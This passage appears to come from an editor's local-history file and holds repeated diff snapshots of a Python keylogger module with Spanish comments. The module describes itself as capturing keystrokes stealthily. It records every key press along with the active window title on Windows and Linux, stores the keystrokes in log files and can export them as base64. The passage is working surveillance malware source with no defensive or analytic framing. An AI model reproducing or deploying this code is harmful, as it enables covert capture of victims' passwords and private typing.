\"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                import win32gui\r\n+                import win32process\r\n+                import win32con\r\n+                while self.running:\r\n+                    try:\r\n+                        hwnd = win32gui.GetForegroundWindow()\r\n+                        _, pid = win32process.GetWindowThreadProcessId(hwnd)\r\n+                        window_title = win32gui.GetWindowText(hwnd)\r\n+                        if window_title != self.current_window:\r\n+                            self.current_window = window_title\r\n+                    except:\r\n+                        pass\r\n+                    time.sleep(0.1)\r\n+            else:\r\n+                # Para Linux\r\n+                try:\r\n+                    import Xlib\r\n+                    import Xlib.display\r\n+                    # Implementación para Linux aquí\r\n+                    pass\r\n+                except ImportError:\r\n+                    logging.warning(\"Xlib no instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    pass\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740261987708,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,231 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                try:\r\n+                    # Importar módulos de Windows de manera segura\r\n+                    from win32gui import GetForegroundWindow, GetWindowText\r\n+                    from win32process import GetWindowThreadProcessId\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            hwnd = GetForegroundWindow()\r\n+                            window_title = GetWindowText(hwnd)\r\n+                            if window_title != self.current_window:\r\n+                                self.current_window = window_title\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"PyWin32 no está instalado correctamente. La detección de ventanas en Windows no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+            else:\r\n+                # Para Linux\r\n+                try:\r\n+                    from Xlib import display\r\n+                    d = display.Display()\r\n+                    root = d.screen().root\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            window_id = root.get_full_property(\r\n+                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n+                                0\r\n+                            ).value[0]\r\n+                            window = d.create_resource_object('window', window_id)\r\n+                            window_name = window.get_full_property(\r\n+                                d.intern_atom('_NET_WM_NAME'), 0\r\n+                            ).value.decode()\r\n+                            if window_name != self.current_window:\r\n+                                self.current_window = window_name\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+            self.current_window = \"Window Detection Error\"\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740261998164,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,231 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                try:\r\n+                    # Importar módulos de Windows de manera segura\r\n+                    from win32gui import GetForegroundWindow, GetWindowText\r\n+                    from win32process import GetWindowThreadProcessId\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            hwnd = GetForegroundWindow()\r\n+                            window_title = GetWindowText(hwnd)\r\n+                            if window_title != self.current_window:\r\n+                                self.current_window = window_title\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"PyWin32 no está instalado correctamente. La detección de ventanas en Windows no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+            else:\r\n+                # Para Linux\r\n+                try:\r\n+                    from Xlib import display\r\n+                    d = display.Display()\r\n+                    root = d.screen().root\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            window_id = root.get_full_property(\r\n+                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n+                                0\r\n+                            ).value[0]\r\n+                            window = d.create_resource_object('window', window_id)\r\n+                            window_name = window.get_full_property(\r\n+                                d.intern_atom('_NET_WM_NAME'), 0\r\n+                            ).value.decode()\r\n+                            if window_name != self.current_window:\r\n+                                self.current_window = window_name\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+            self.current_window = \"Window Detection Error\"\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740262119381,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,231 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                try:\r\n+                    # Importar módulos de Windows de manera segura\r\n+                    from win32gui import GetForegroundWindow, GetWindowText\r\n+                    from win32process import GetWindowThreadProcessId\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            hwnd = GetForegroundWindow()\r\n+                            window_title = GetWindowText(hwnd)\r\n+                            if window_title != self.current_window:\r\n+                                self.current_window = window_title\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"PyWin32 no está instalado correctamente. La detección de ventanas en Windows no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+            else:\r\n+                # Para Linux\r\n+                try:\r\n+                    from Xlib import display\r\n+                    d = display.Display()\r\n+                    root = d.screen().root\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            window_id = root.get_full_property(\r\n+                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n+                                0\r\n+                            ).value[0]\r\n+                            window = d.create_resource_object('window', window_id)\r\n+                            window_name = window.get_full_property(\r\n+                                d.intern_atom('_NET_WM_NAME'), 0\r\n+                            ).value.decode()\r\n+                            if window_name != self.current_window:\r\n+                                self.current_window = window_name\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+            self.current_window = \"Window Detection Error\"\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+            total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740262132218,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -228,888 +228,4 @@\n                 }\r\n             }\r\n         except Exception as e:\r\n             return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                try:\r\n-                    # Importar módulos de Windows de manera segura\r\n-                    from win32gui import GetForegroundWindow, GetWindowText\r\n-                    from win32process import GetWindowThreadProcessId\r\n-                    \r\n-                    while self.running:\r\n-                        try:\r\n-                            hwnd = GetForegroundWindow()\r\n-                            window_title = GetWindowText(hwnd)\r\n-                            if window_title != self.current_window:\r\n-                                self.current_window = window_title\r\n-                        except:\r\n-                            self.current_window = \"Unknown Window\"\r\n-                        time.sleep(0.1)\r\n-                except ImportError:\r\n-                    logging.warning(\"PyWin32 no está instalado correctamente. La detección de ventanas en Windows no estará disponible.\")\r\n-                    self.current_window = \"Window Detection Disabled\"\r\n-            else:\r\n-                # Para Linux\r\n-                